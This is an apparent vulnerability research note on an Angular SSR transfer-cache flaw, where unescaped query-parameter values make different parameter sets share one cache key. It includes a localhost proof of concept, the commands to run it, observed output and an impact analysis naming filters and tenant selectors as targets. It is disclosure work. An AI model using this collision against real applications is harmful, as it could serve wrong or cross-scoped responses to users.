# A18 deterministic param separator collision

Date: 2026-04-30

## Goal

Check whether `sortAndConcatParams()` creates deterministic collisions not only for comma-joined
arrays, but also for query separator characters in parameter values.

## Finding

`sortAndConcatParams()` constructs the param key material as:

```ts
`${k}=${params.getAll(k)}`
```

and joins params with:

```ts
.join('&')
```

Because values are inserted into the transfer-cache key without escaping, these two semantically
different parameter sets produce the same key material:

```text
a=1%26b=2  -> one param:  a = "1&b=2" -> key material a=1&b=2
a=1&b=2    -> two params: a = "1", b = "2" -> key material a=1&b=2
```

This is a deterministic pre-hash collision and does not require brute-forcing the 32-bit `StateKey`.

## PoC

File:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app/params_separator_collision_server.ts
```

The SSR component makes two same-URL requests:

```ts
const encodedAmpValue = new HttpParams({fromObject: {a: '1&b=2'}});
const splitParams = new HttpParams({fromObject: {a: '1', b: '2'}});

http.get('/api/query', {params: encodedAmpValue, responseType: 'text'});
http.get('/api/query', {params: splitParams, responseType: 'text'});
```

The backend treats one encoded `&` inside a value and two separate params differently:

```text
/api/query?a=1%26b=2 -> single:a=1&b=2
/api/query?a=1&b=2   -> split:a=1|b=2
```

## Commands

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx params_separator_collision_server.ts
curl -sS 'http://127.0.0.1:4223/'
```

## Observed HTML

```html
<div id="query">first=single:a=1&amp;b=2|second=single:a=1&amp;b=2</div>
```

Expected if the second request reached the backend:

```html
<div id="query">first=single:a=1&amp;b=2|second=split:a=1|b=2</div>
```

Observed `ng-state`:

```json
{
  "1016375229": {
    "b": "single:a=1&b=2",
    "h": {},
    "s": 200,
    "st": "OK",
    "u": "http://127.0.0.1:4223/api/query",
    "rt": "text"
  }
}
```

## Observed server log

```text
[api] /api/query hit 1 url= /api/query?a=1%26b=2 body= single:a=1&b=2
[ssr] first query body: single:a=1&b=2
[ssr] second query body: single:a=1&b=2
[express] api hit counts query= 1
```

The second request `/api/query?a=1&b=2` did not reach the backend. Angular replayed the cached
response for `/api/query?a=1%26b=2`.

## Impact interpretation

This strengthens A18 because an attacker does not need a 32-bit hash collision:

- the collision is caused by Angular's deterministic param serialization;
- `%26` in parameter values is common and valid;
- backends often distinguish one value containing `&` from multiple parameters;
- security-sensitive filters, scopes, tenant selectors, and feature flags can be encoded in repeated
  or split query params.

This remains same-render response confusion by itself, but it is fully framework-owned key
confusion and easier to reach than a chosen hash collision.
